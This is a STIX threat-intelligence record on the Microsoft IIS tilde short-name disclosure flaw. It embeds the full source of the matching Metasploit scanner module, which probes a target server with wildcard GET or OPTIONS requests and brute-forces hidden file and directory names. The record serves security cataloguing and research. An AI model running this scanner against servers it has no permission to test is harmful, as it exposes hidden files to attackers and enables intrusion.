{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--2f3997b0-003a-4ca9-b523-c16d4620e62e",
    "created": "2024-08-14T16:30:31.497016Z",
    "modified": "2024-08-14T16:30:31.49702Z",
    "name": "Microsoft IIS shortname vulnerability scanner",
    "description": " The vulnerability is caused by a tilde character \"~\" in a GET or OPTIONS request, which could allow remote attackers to disclose 8.3 filenames (short names). In 2010, Soroush Dalili and Ali Abbasnejad discovered the original bug (GET request). This was publicly disclosed in 2012. In 2014, Soroush Dalili discovered that newer IIS installations are vulnerable with OPTIONS. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/http/iis_shortname_scanner.rb",
            "external_id": "iis_shortname_scanner.rb"
        },
        {
            "source_name": "reference",
            "url": "https://soroush.secproject.com/blog/tag/iis-tilde-vulnerability/"
        },
        {
            "source_name": "reference",
            "url": "https://support.detectify.com/customer/portal/articles/1711520-microsoft-iis-tilde-vulnerability"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::Report\n  include Rex::Proto::Http\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name'        => 'Microsoft IIS shortname vulnerability scanner',\n        'Description' => %q{\n         The vulnerability is caused by a tilde character \"~\" in a GET or OPTIONS request, which\n         could allow remote attackers to disclose 8.3 filenames (short names). In 2010, Soroush Dalili\n         and Ali Abbasnejad discovered the original bug (GET request). This was publicly disclosed in\n         2012. In 2014, Soroush Dalili discovered that newer IIS installations are vulnerable with OPTIONS.\n        },\n        'Author'         =>\n          [\n          'Soroush Dalili', # Vulnerability discovery\n          'Ali Abbasnejad', # Vulnerability discovery\n          'MinatoTW <shaks19jais[at]gmail.com>', # Metasploit module\n          'egre55 <ianaustin[at]protonmail.com>' # Metasploit module\n          ],\n        'License'     => MSF_LICENSE,\n        'References'     =>\n          [\n            [ 'URL', 'https://soroush.secproject.com/blog/tag/iis-tilde-vulnerability/' ],\n            [ 'URL', 'https://support.detectify.com/customer/portal/articles/1711520-microsoft-iis-tilde-vulnerability' ]\n          ]\n      )\n    )\n\n    register_options([\n      Opt::RPORT(80),\n      OptString.new('PATH', [ true, \"The base path to start scanning from\", \"/\" ]),\n      OptInt.new('THREADS', [ true, \"Number of threads to use\", 20])\n    ])\n    @dirs = []\n    @files = []\n    @threads = []\n    @queue = Queue.new\n    @queue_ext = Queue.new\n    @alpha = 'abcdefghijklmnopqrstuvwxyz0123456789!#$%&\\'()-@^_`{}'\n    @charset_names = []\n    @charset_extensions = []\n    @charset_duplicates = []\n    @verb = \"\"\n    @name_size= 6\n    @path = \"\"\n  end\n\n  def check\n    is_vul ? Exploit::CheckCode::Vulnerable : Exploit::CheckCode::Safe\n  rescue Rex::ConnectionError\n    print_bad(\"Failed to connect to target\")\n  end\n\n  def is_vul\n    @path = datastore['PATH']\n    for method in ['GET', 'OPTIONS']\n      # Check for existing file\n      res1 = send_request_cgi({\n        'uri' => normalize_uri(@path, '*~1*'),\n        'method' => method\n      })\n\n      # Check for non-existing file\n      res2 = send_request_cgi({\n        'uri' => normalize_uri(@path,'QYKWO*~1*'),\n        'method' => method\n      })\n\n      if res1 && res1.code == 404 && res2 && res2.code != 404\n        @verb = method\n        return true\n      end\n    end\n    return false\n  rescue Rex::ConnectionError\n    print_bad(\"Failed to connect to target\")\n  end\n\n  def get_status(f , digit , match)\n    # Get response code for a file/folder\n    res2 = send_request_cgi({\n      'uri' => normalize_uri(@path,\"#{f}#{match}~#{digit}#{match}\"),\n      'method' => @verb\n    })\n    return res2.code\n  rescue NoMethodError\n      print_error(\"Unable to connect to #{datastore['RHOST']}\")\n  end\n\n  def get_incomplete_status(url, match, digit , ext)\n    # Check if the file/folder name is more than 6 by using wildcards\n    res2 = send_request_cgi({\n      'uri' => normalize_uri(@path,\"#{url}#{match}~#{digit}.#{ext}*\"),\n      'method' => @verb\n    })\n    return res2.code\n  rescue NoMethodError\n      print_error(\"Unable to connect to #{datastore['RHOST']}\")\n  end\n\n  def get_complete_status(url, digit , ext)\n    # Check if the file/folder name is less than 6 and complete\n    res2 = send_request_cgi({\n      'uri' => normalize_uri(@path,\"#{url}*~#{digit}.#{ext}\"),\n      'method' => @verb\n    })\n    return res2.code\n  rescue NoMethodError\n      print_error(\"Unable to connect to #{datastore['RHOST']}\")\n  end\n\n  def scanner\n    while !@queue_ext.empty?\n      f = @queue_ext.pop\n      url = f.split(':')[0]\n      ext = f.split(':')[1]\n      # Split string into name and extension and check status\n      status = get_incomplete_status(url, \"*\" , \"1\" , ext)\n      next unless status == 404\n      next unless ext.size <= 3\n\n      @charset_duplicates.each do |x|\n        if get_complete_status(url, x , ext) == 404\n          @files << \"#{url}*~#{x}.#{ext}*\"\n        end\n      end\n\n      if ext.size < 3\n        for c in @charset_extensions\n          @queue_ext << (f + c )\n        end\n      end\n    end\n  end\n\n  def scan\n    while !@queue.empty?\n      url = @queue.pop\n      status = get_status(url , \"1\" , \"*\")\n      # Check strings only upto 6 chars in length\n      next unless status == 404\n      if url.size == @name_size\n        @charset_duplicates.each do |x|\n          if get_status(url , x , \"\") == 404\n            @dirs << \"#{url}*~#{x}\"\n          end\n        end\n        # If a url exists then add to new queue for extension scan\n        for ext in @charset_extensions\n          @queue_ext << ( url + ':' + ext )\n          @threads << framework.threads.spawn(\"scanner\", false) { scanner }\n        end\n      else\n        @charset_duplicates.each do |x|\n          if get_complete_status(url, x , \"\") == 404\n            @dirs << \"#{url}*~#{x}\"\n            break\n          end\n        end\n        if get_incomplete_status(url, \"\" , \"1\" , \"\") == 404\n          for ext in @charset_extensions\n            @queue_ext << ( url + ':' + ext )\n            @threads << framework.threads.spawn(\"scanner\", false) { scanner }\n          end\n        elsif url.size < @name_size\n          for c in @charset_names\n            @queue  <<(url +c)\n          end\n        end\n      end\n    end\n  end\n\n  def reduce\n    # Reduce the total charset for filenames by checking if a character exists in any of the files\n    for c in @alpha.chars\n      res = send_request_cgi({\n        'uri' => normalize_uri(@path,\"*#{c}*~1*\"),\n        'method' => @verb\n      })\n      if res && res.code == 404\n        @charset_names << c\n      end\n    end\n  end\n\n  def ext\n    # Reduce the total charset for extensions by checking if a character exists in any of the extensions\n    for c in @alpha.chars\n      res = send_request_cgi({\n        'uri' => normalize_uri(@path,\"*~1.*#{c}*\"),\n        'method' => @verb\n      })\n      if res && res.code == 404\n        @charset_extensions << c\n      end\n    end\n  end\n\n  def dup\n    # Reduce the total charset for duplicate files/folders\n    array = [*('1'..'9')]\n    array.each do |c|\n      res = send_request_cgi({\n        'uri' => normalize_uri(@path,\"*~#{c}.*\"),\n        'method' => @verb\n      })\n      if res && res.code == 404\n        @charset_duplicates << c\n      end\n    end\n  end\n\n  def run\n    unless is_vul\n      print_status(\"Target is not vulnerable, or no shortname scannable files are present.\")\n      return\n    end\n    unless @path.end_with? '/'\n      @path += '/'\n    end\n    print_status(\"Scanning in progress...\")\n    @threads << framework.threads.spawn(\"reduce_names\",false) { reduce }\n    @threads << framework.threads.spawn(\"reduce_duplicates\",false) { dup }\n    @threads << framework.threads.spawn(\"reduce_extensions\",false) { ext }\n    @threads.each(&:join)\n\n    for c in @charset_names\n      @queue << c\n    end\n\n    datastore['THREADS'].times {\n      @threads << framework.threads.spawn(\"scanner\", false) { scan }\n    }\n\n    Rex.sleep(1) until @queue_ext.empty?\n\n    @threads.each(&:join)\n\n    proto = datastore['SSL'] ? 'https' : 'http'\n\n    if @dirs.empty?\n      print_status(\"No directories were found\")\n    else\n      print_good(\"Found #{@dirs.size} directories\")\n      @dirs.each do |x|\n        print_good(\"#{proto}://#{datastore['RHOST']}#{@path}#{x}\")\n      end\n    end\n\n    if @files.empty?\n      print_status(\"No files were found\")\n    else\n      print_good(\"Found #{@files.size} files\")\n      @files.each do |x|\n        print_good(\"#{proto}://#{datastore['RHOST']}#{@path}#{x}\")\n      end\n    end\n  end\nend\n\n"
}